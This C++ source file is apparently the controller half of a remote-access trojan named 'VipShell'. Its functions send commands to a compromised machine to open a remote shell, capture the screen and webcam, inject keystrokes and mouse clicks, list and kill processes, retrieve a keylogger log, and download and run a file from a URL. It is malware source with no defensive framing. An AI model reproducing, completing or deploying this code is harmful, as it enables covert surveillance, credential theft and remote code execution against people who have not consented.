#include "stdafx.h"
#include ".\serverconnecthandle.h"

CServerConnectHandle::CServerConnectHandle(void)
{
	m_dwLastCmd = 0;
	m_dwCareer = -1;
}

CServerConnectHandle::~CServerConnectHandle(void)
{
}

void CServerConnectHandle::SetServerInfoAtThis(tagServerSystemInfo* pInfo)
{
	memcpy(&m_SystemInfo, pInfo, sizeof(tagServerSystemInfo));
}
void CServerConnectHandle::GetServerInfoAtThis(tagServerSystemInfo* pInfo)
{
	memcpy(pInfo, &m_SystemInfo, sizeof(tagServerSystemInfo));
}
bool CServerConnectHandle::GetServerInfo(tagServerSystemInfo* pInfo)
{
	CGetTransmitTime dwCareer(&m_dwCareer);
	m_dwLastCmd = GetTickCount();
	int nRet;
	int nBufLen = sizeof(tagVipShellCmd);
	tagVipShellCmd cmd;
	cmd.dwCmd = CMD_GETSYSTEMINFO;
	nRet = m_hServer.Send(&cmd, sizeof(tagVipShellCmd));
	if(nRet == 0)
		return false;
	if(nRet == SOCKET_ERROR)
		return false;
	
	if(nRet != nBufLen)
	{
		int i = 0;
	}
	if(!m_hServer.IsRecvTimeOut())
		return false;
	nRet = m_hServer.Recv(&cmd, sizeof(tagVipShellCmd));
	if(nRet == 0)
		return false;
	if(nRet == SOCKET_ERROR)
		return false;

	memcpy(pInfo, cmd.pBuff, sizeof(tagServerSystemInfo));
	SetServerInfoAtThis(pInfo);
	return true;
}
bool CServerConnectHandle::GetShell()
{
	tagServerSystemInfo Info;
	tagServerSystemInfo* pInfo = &Info;
	int nRet;
	tagVipShellCmd cmd;
	cmd.dwCmd = CMD_GETSHELL;
	nRet = m_hServer.Send(&cmd, sizeof(tagVipShellCmd));
	if(nRet == SOCKET_ERROR)
		return false;
	if(!m_hServer.IsRecvTimeOut())
		return false;
	nRet = m_hServer.Recv(&cmd, sizeof(tagVipShellCmd));
	if(nRet == SOCKET_ERROR)
		return false;
	memcpy(pInfo, cmd.pBuff, sizeof(tagServerSystemInfo));
	SetServerInfoAtThis(pInfo);
	return true;
}
DWORD CServerConnectHandle::GetScreenInput()
{
	tagServerSystemInfo Info;
	tagServerSystemInfo* pInfo = &Info;
	int nRet;
	tagVipShellCmd cmd;
	cmd.dwCmd = CMD_GETSCREEN;
	nRet = m_hServer.Send(&cmd, sizeof(tagVipShellCmd));
	if(nRet == SOCKET_ERROR)
		return -1;
	if(!m_hServer.IsRecvTimeOut())
		return false;
	nRet = m_hServer.Recv(&cmd, sizeof(tagVipShellCmd));
	if(nRet == SOCKET_ERROR)
		return -1;
	memcpy(pInfo, cmd.pBuff, sizeof(tagServerSystemInfo));
	SetServerInfoAtThis(pInfo);
	return cmd.dw1;
}

bool CServerConnectHandle::SendKeyDown(int nVirtKey)
{
	int nRet;
	tagVipShellCmd cmd;
	cmd.dwCmd = CMD_KEYDOWN;
	cmd.dw1 = nVirtKey;
	nRet = m_hServer.Send(&cmd, sizeof(tagVipShellCmd));
	if(nRet == SOCKET_ERROR)
		return false;
	if(!m_hServer.IsRecvTimeOut())
		return false;
	nRet = m_hServer.Recv(&cmd, sizeof(tagVipShellCmd));
	if(nRet == SOCKET_ERROR)
		return false;
	return true;
}
bool CServerConnectHandle::SendKeyUp(int nVirtKey)
{
	int nRet;
	tagVipShellCmd cmd;
	cmd.dwCmd = CMD_KEYUP;
	cmd.dw1 = nVirtKey;
	nRet = m_hServer.Send(&cmd, sizeof(tagVipShellCmd));
	if(nRet == SOCKET_ERROR)
		return false;
	if(!m_hServer.IsRecvTimeOut())
		return false;
	nRet = m_hServer.Recv(&cmd, sizeof(tagVipShellCmd));
	if(nRet == SOCKET_ERROR)
		return false;
	return true;
}
bool CServerConnectHandle::SendMouseMove(POINT* pt)
{
	int nRet;
	tagVipShellCmd cmd;
	cmd.dwCmd = CMD_MOUSEMOVE;
	cmd.dw1 = pt->x;
	cmd.dw2 = pt->y;
	nRet = m_hServer.Send(&cmd, sizeof(tagVipShellCmd));
	if(nRet == SOCKET_ERROR)
		return false;
	if(!m_hServer.IsRecvTimeOut())
		return false;
	nRet = m_hServer.Recv(&cmd, sizeof(tagVipShellCmd));
	if(nRet == SOCKET_ERROR)
		return false;
	return true;
}
bool CServerConnectHandle::SendLButtonDown()
{

	int nRet;
	tagVipShellCmd cmd;
	cmd.dwCmd = CMD_LBUTTONDOWN;
	nRet = m_hServer.Send(&cmd, sizeof(tagVipShellCmd));
	if(nRet == SOCKET_ERROR)
		return false;
	if(!m_hServer.IsRecvTimeOut())
		return false;
	nRet = m_hServer.Recv(&cmd, sizeof(tagVipShellCmd));
	if(nRet == SOCKET_ERROR)
		return false;
	return true;
}

bool CServerConnectHandle::SendLButtonUp()
{
	int nRet;
	tagVipShellCmd cmd;
	cmd.dwCmd = CMD_LBUTTONUP;
	nRet = m_hServer.Send(&cmd, sizeof(tagVipShellCmd));
	if(nRet == SOCKET_ERROR)
		return false;
	if(!m_hServer.IsRecvTimeOut())
		return false;
	nRet = m_hServer.Recv(&cmd, sizeof(tagVipShellCmd));
	if(nRet == SOCKET_ERROR)
		return false;
	return true;
}
bool CServerConnectHandle::SendLButtonDblclk()
{
	int nRet;
	tagVipShellCmd cmd;
	cmd.dwCmd = CMD_LBUTTONDBLCLK;
	nRet = m_hServer.Send(&cmd, sizeof(tagVipShellCmd));
	if(nRet == SOCKET_ERROR)
		return false;
	if(!m_hServer.IsRecvTimeOut())
		return false;
	nRet = m_hServer.Recv(&cmd, sizeof(tagVipShellCmd));
	if(nRet == SOCKET_ERROR)
		return false;
	return true;
}
bool CServerConnectHandle::SendRButtonDown()
{
	int nRet;
	tagVipShellCmd cmd;
	cmd.dwCmd = CMD_RBUTTONDOWN;
	nRet = m_hServer.Send(&cmd, sizeof(tagVipShellCmd));
	if(nRet == SOCKET_ERROR)
		return false;
	if(!m_hServer.IsRecvTimeOut())
		return false;
	nRet = m_hServer.Recv(&cmd, sizeof(tagVipShellCmd));
	if(nRet == SOCKET_ERROR)
		return false;
	return true;
}
bool CServerConnectHandle::SendRButtonUp()
{
	int nRet;
	tagVipShellCmd cmd;
	cmd.dwCmd = CMD_RBUTTONUP;
	nRet = m_hServer.Send(&cmd, sizeof(tagVipShellCmd));
	if(nRet == SOCKET_ERROR)
		return false;
	if(!m_hServer.IsRecvTimeOut())
		return false;
	nRet = m_hServer.Recv(&cmd, sizeof(tagVipShellCmd));
	if(nRet == SOCKET_ERROR)
		return false;
	return true;
}
bool CServerConnectHandle::SendRButtonDblclk()
{
	int nRet;
	tagVipShellCmd cmd;
	cmd.dwCmd = CMD_RBUTTONDBLCLK;
	nRet = m_hServer.Send(&cmd, sizeof(tagVipShellCmd));
	if(nRet == SOCKET_ERROR)
		return false;
	if(!m_hServer.IsRecvTimeOut())
		return false;
	nRet = m_hServer.Recv(&cmd, sizeof(tagVipShellCmd));
	if(nRet == SOCKET_ERROR)
		return false;
	return true;
}
bool CServerConnectHandle::SendKeyCtrlAltDel()
{
	int nRet;
	tagVipShellCmd cmd;
	cmd.dwCmd = CMD_KEYCTRLALTDEL;
	nRet = m_hServer.Send(&cmd, sizeof(tagVipShellCmd));
	if(nRet == SOCKET_ERROR)
		return false;
	if(!m_hServer.IsRecvTimeOut())
		return false;
	nRet = m_hServer.Recv(&cmd, sizeof(tagVipShellCmd));
	if(nRet == SOCKET_ERROR)
		return false;
	return true;
}

bool CServerConnectHandle::GetCap()
{
	tagServerSystemInfo Info;
	tagServerSystemInfo* pInfo = &Info;
	int nRet;
	tagVipShellCmd cmd;
	cmd.dwCmd = CMD_GETCAP;
	nRet = m_hServer.Send(&cmd, sizeof(tagVipShellCmd));
	if(nRet == SOCKET_ERROR)
		return false;
	if(!m_hServer.IsRecvTimeOut())
		return false;
	nRet = m_hServer.Recv(&cmd, sizeof(tagVipShellCmd));
	if(nRet == SOCKET_ERROR)
		return false;
	if(cmd.dwCmd != CMD_ISOK)
		return false;
	memcpy(pInfo, cmd.pBuff, sizeof(tagServerSystemInfo));
	SetServerInfoAtThis(pInfo);
	return true;
}
bool CServerConnectHandle::GetFileManage()
{
	int nRet;
	tagVipShellCmd cmd;
	cmd.dwCmd = CMD_GETFILEMANAGE;
	nRet = m_hServer.Send(&cmd, sizeof(tagVipShellCmd));
	if(nRet == SOCKET_ERROR)
		return false;
	if(!m_hServer.IsRecvTimeOut())
		return false;
	nRet = m_hServer.Recv(&cmd, sizeof(tagVipShellCmd));
	if(nRet == SOCKET_ERROR)
		return false;
	return true;
}
DWORD CServerConnectHandle::GetProcessList(std::vector<tagVipShellProcess>* pVecTor)
{
	pVecTor->clear();
	int nRet;
	tagVipShellCmd cmd;
	cmd.dwCmd = CMD_GETPROCESSLIST;
	nRet = m_hServer.Send(&cmd, sizeof(tagVipShellCmd));
	if(nRet == SOCKET_ERROR)
		return -1;
	if(!m_hServer.IsRecvTimeOut())
		return false;
	nRet = m_hServer.Recv(&cmd, sizeof(tagVipShellCmd));
	if(nRet == SOCKET_ERROR)
		return -1;
	if(cmd.dw1 == 0)
		return 0;
	DWORD dwLen = cmd.dw1 ;
	cmd.dwCmd = CMD_ISOK;
	nRet = m_hServer.Send(&cmd, sizeof(tagVipShellCmd));
	if(nRet == SOCKET_ERROR)
		return -1;
	BYTE* bBuf = new BYTE[dwLen * sizeof(tagVipShellProcess)];
	nRet = _RecvBuffData(bBuf, dwLen * sizeof(tagVipShellProcess));
	tagVipShellProcess proc;
	for(DWORD i = 0; i < dwLen; i++)
	{
		memcpy(&proc, bBuf +( i * sizeof(tagVipShellProcess)), sizeof(tagVipShellProcess));
		pVecTor->push_back(proc);
	}
	delete bBuf;
	if(nRet == SOCKET_ERROR)
		return -1;
	return (DWORD)pVecTor->size();
}
bool CServerConnectHandle::KillProcess(DWORD dwId)
{
	tagVipShellCmd cmd;
	cmd.dwCmd = CMD_KILLPROCESS;
	cmd.dw1 = dwId;
	int nRet = m_hServer.Send(&cmd, sizeof(tagVipShellCmd));
	if(nRet == SOCKET_ERROR)
		return false;
	if(!m_hServer.IsRecvTimeOut())
		return false;
	nRet = m_hServer.Recv(&cmd, sizeof(tagVipShellCmd));
	if(nRet == SOCKET_ERROR)
		return false;
	if(cmd.dw1 == CMD_ISOK)
		return true;
	return false;
}
bool CServerConnectHandle::GetServerKeyLog()
{
	int nRet;
	tagVipShellCmd cmd;
	cmd.dwCmd = CMD_GETKEYLOG;
	nRet = m_hServer.Send(&cmd, sizeof(tagVipShellCmd));
	if(nRet == SOCKET_ERROR)
		return false;
	if(!m_hServer.IsRecvTimeOut())
		return false;
	nRet = m_hServer.Recv(&cmd, sizeof(tagVipShellCmd));
	if(nRet == SOCKET_ERROR)
		return false;
	return true;
}

bool CServerConnectHandle::DownFileAndRun(LPCTSTR szUrl)
{
	tagVipShellCmd cmd;
	cmd.dwCmd = CMD_DOWNFILERUN;
	lstrcpy((LPWSTR)cmd.pBuff, szUrl);
	int nRet = m_hServer.Send(&cmd, sizeof(tagVipShellCmd));
	if(nRet == SOCKET_ERROR)
		return false;
	if(!m_hServer.IsRecvTimeOut())
		return false;
	nRet = m_hServer.Recv(&cmd, sizeof(tagVipShellCmd));
	if(nRet == SOCKET_ERROR)
		return false;
	return true;
}

bool CServerConnectHandle::SetServerExplain(LPCTSTR sz)
{
	tagVipShellCmd cmd;
	cmd.dwCmd = CMD_SETCONFIG;
	cmd.dw1 = 1;
	lstrcpy((LPWSTR)cmd.pBuff, sz);
	int nRet = m_hServer.Send(&cmd, sizeof(tagVipShellCmd));
	if(nRet == SOCKET_ERROR)
		return false;
	if(!m_hServer.IsRecvTimeOut())
		return false;
	nRet = m_hServer.Recv(&cmd, sizeof(tagVipShellCmd));
	if(nRet == SOCKET_ERROR)
		return false;
	return true;
}